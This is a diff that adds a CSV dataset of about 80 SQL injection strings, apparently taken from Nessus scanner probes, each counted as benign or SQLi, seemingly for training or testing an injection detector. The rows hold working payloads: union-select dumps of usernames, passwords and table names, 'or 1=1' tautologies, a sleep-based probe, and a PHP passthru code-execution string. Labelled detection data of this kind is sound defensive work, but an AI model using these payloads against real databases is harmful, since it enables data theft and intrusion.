@@ -1,0 +1,82 @@
+sub_key,benign,sqli
+"' union select 1,1,'1675421648','calendarix_month_sql_injection.nasl',1 #",0,1
+"' union select 1,1,'1678439980','calendarix_month_sql_injection.nasl',1 #",0,1
+')	union	select	*	from	(select	null)	as	a1		join	(select	1)	as	u	join	(select	user())	as	b1	join	(select	user())	as	b2	join	(select	null)	as	a3		join	(select	null)	as	a4		join	(select	null)	as	a5		join	(select	null)	as	a6		join	(select	null)	as	a7		join	(select	null)	as	a8		join	(select	null)	as	a9	join	(select	null)	as	a10	join	(select	null)	as	a11	join	(select	null)	as	a12	join	(select	null)	as	a13		join	(select	null)	as	a14		join	(select	null)	as	a15		join	(select	null)	as	a16		join	(select	null)	as	a17		join	(select	null)	as	a18		join	(select	null)	as	a19		join	(select	null)	as	a20		join	(select	null)	as	a21		join	(select	null)	as	a22	where	('%'=',0,1
+"') union select 'pixelpost_15rc1.nasl-1675421354.jpg' as id, 1486171125 as headline, 450348508 as datetime, 1627477279 as body, 1770692472 as category, 297573973 as image--",0,1
+"') union select 'pixelpost_15rc1.nasl-1675421355.jpg' as id, 1955936317 as headline, 597289517 as datetime, 416457928 as body, 661050232 as category, 1070200399 as image--",0,1
+"') union select 'pixelpost_15rc1.nasl-1675421355.jpg' as id, 248747384 as headline, 1013231709 as datetime, 1076951119 as body, 1742764568 as category, 763794215 as image--",0,1
+"') union select 'pixelpost_15rc1.nasl-1678439624.jpg' as id, 1035936413 as headline, 1693361443 as datetime, 292399492 as body, 1401815516 as category, 2119971038 as image--",0,1
+"') union select 'pixelpost_15rc1.nasl-1678439625.jpg' as id, 1786288852 as headline, 372841801 as datetime, 1468515970 as body, 1959632349 as category, 1826861597 as image--",0,1
+"') union select 'pixelpost_15rc1.nasl-1678439625.jpg' as id, 376699200 as headline, 1697067076 as datetime, 704782749 as body, 122667165 as category, 338293917 as image--",0,1
+"'union select '1','2','pixelpost_category_sql_injection.nasl','1675421354','5'--",0,1
+"'union select '1','2','pixelpost_category_sql_injection.nasl','1675421355','5'--",0,2
+"'union select '1','2','pixelpost_category_sql_injection.nasl','1678439635','5'--",0,1
+"'union select '1','2','pixelpost_category_sql_injection.nasl','1678439636','5'--",0,2
+"-1 union select 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 from simpgb_users where 1",0,3
+"-1 union select 0,1,2,086338700605,4,5,6,7,8,9,10,11--",0,1
+"-1 union select 0,1,2,504112083877,4,5,6,7,8,9,10,11--",0,1
+"-1 union select 0,1,2,576806432661,4,5,6,7,8,9,10,11--",0,1
+"-1 union select 0,1,2,731765963758,4,5,6,7,8,9,10,11--",0,1
+"-1 union select 0,1,2,893255989704,4,5,6,7,8,9,10,11--",0,1
+"-1 union select 0,1,2,920236486910,4,5,6,7,8,9,10,11--",0,1
+"-1 union select 1,1675421213,750909353 --",0,1
+"-1 union select 1,1675421219,1194170443 --",0,1
+"-1 union select 1,1675421219,1194985780 --",0,1
+"-1 union select 1,1678439484,1448956727 --",0,1
+"-1 union select 1,1678439485,22105947 --",0,1
+"-1 union select 1,1678439485,47372316 --",0,1
+-1 union select group_concat(table_name) from information_schema.tables,0,1
+"-1 union select null,123456,null,null,null,null--",0,3
+"-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1675421458',null,null,null,null --",0,1
+"-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1675421459',null,null,null,null --",0,2
+"-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1678439742',null,null,null,null --",0,1
+"-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1678439743',null,null,null,null --",0,1
+"-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1678439744',null,null,null,null --",0,1
+"-1' union select 0,1509476899,0,0,0,0,0--",0,1
+"-1' union select 0,1573270675,0,0,0,0,0--",0,1
+"-1' union select 0,311346617,0,0,0,0,0--",0,1
+"-1' union select 0,336678371,0,0,0,0,0--",0,1
+"-1' union select 0,713811531,0,0,0,0,0--",0,1
+"-1' union select 0,918606042,0,0,0,0,0--",0,1
+-144 or 1=1,0,1
+-1678439414 or 1=1 -- ';passthru(base64_decode($_server[http_nessus_nkqzhkgv]));die;/*,0,1
+-1678439415 or 1=1 -- ';passthru(base64_decode($_server[http_nessus_as0do898]));die;/*,0,1
+-1678439415 or 1=1 -- ';passthru(base64_decode($_server[http_nessus_jeqinhpg]));die;/*,0,1
+-191 or 1=1,0,1
+"-245' union select 1,concat(0x73,0x69,0x74,0x65,0x78,0x5f,0x61,0x6c,0x62,0x75,0x6d,0x69,0x64,0x5f,0x73,0x71,0x6c,0x69,0x2e,0x6e,0x61,0x73,0x6c),3,4,5,6,7,8 -- '",0,1
+-29 or 1=1,0,1
+"-296' union select 1,concat(0x73,0x69,0x74,0x65,0x78,0x5f,0x61,0x6c,0x62,0x75,0x6d,0x69,0x64,0x5f,0x73,0x71,0x6c,0x69,0x2e,0x6e,0x61,0x73,0x6c),3,4,5,6,7,8 -- '",0,1
+"-341' union select 1,concat(0x73,0x69,0x74,0x65,0x78,0x5f,0x61,0x6c,0x62,0x75,0x6d,0x69,0x64,0x5f,0x73,0x71,0x6c,0x69,0x2e,0x6e,0x61,0x73,0x6c),3,4,5,6,7,8 -- '",0,1
+"-39' union select 1,concat(0x73,0x69,0x74,0x65,0x78,0x5f,0x61,0x6c,0x62,0x75,0x6d,0x69,0x64,0x5f,0x73,0x71,0x6c,0x69,0x2e,0x6e,0x61,0x73,0x6c),3,4,5,6,7,8 -- '",0,1
+-493 or 1=1,0,1
+"-600' union select 1,concat(0x73,0x69,0x74,0x65,0x78,0x5f,0x61,0x6c,0x62,0x75,0x6d,0x69,0x64,0x5f,0x73,0x71,0x6c,0x69,0x2e,0x6e,0x61,0x73,0x6c),3,4,5,6,7,8 -- '",0,1
+-784 or 1=1,0,1
+"-9 union select null,null,null,1675421314,4,5",0,1
+"-9 union select null,null,null,1678439600,4,5",0,1
+"-91' union select 1,concat(0x73,0x69,0x74,0x65,0x78,0x5f,0x61,0x6c,0x62,0x75,0x6d,0x69,0x64,0x5f,0x73,0x71,0x6c,0x69,0x2e,0x6e,0x61,0x73,0x6c),3,4,5,6,7,8 -- '",0,1
+-980 or 1=1,0,1
+"-99' union select null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null--",0,5
+0 or 1=1,0,2
+"0 union select -1,'exponent_0964.nasl','nessus test','o:8:""stdclass"":3:{s:3:""mod"";s:15:""resourcesmodule"";s:3:""src"";s:20:""@random41940ceb78dbb"";s:3:""int"";s:0:"""";}',7,0,0,0,0,0,0 --",0,4
+"1 union select 1,1675421649",0,1
+"1 union select 1,1675421650",0,1
+"1 union select 1,1678439982",0,1
+"1 union select 1,1678439983",0,1
+"1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params""having 1=1",0,3
+"1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--",0,4
+204,1,0
+34 union select 1122337590,0,1
+34 union select 1698965027,0,1
+34 union select 1857565265,0,1
+34 union select 1888110431,0,1
+34 union select 661353597,0,1
+34 union select 780153735,0,1
+"[""' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- ""]",0,3
+"['-99 union select 1179710052,2,1703603612,4,5,6,7,8,9,0,1,2,3 --']",0,2
+"['-99 union select 757777915,2,138073752,4,5,6,7,8,9,0,1,2,3 --']",0,1
+"pligg_url_sql_injection.nasl' union select 1675421350,1484453831 --",0,2
+"pligg_url_sql_injection.nasl' union select 1678439632,891954418 --",0,2
+select * from sys.dba_users,0,1
+select username from all_users,0,2
+union select all from information_schema and ' or sleep(5) or ',0,6
+unknown,109,0
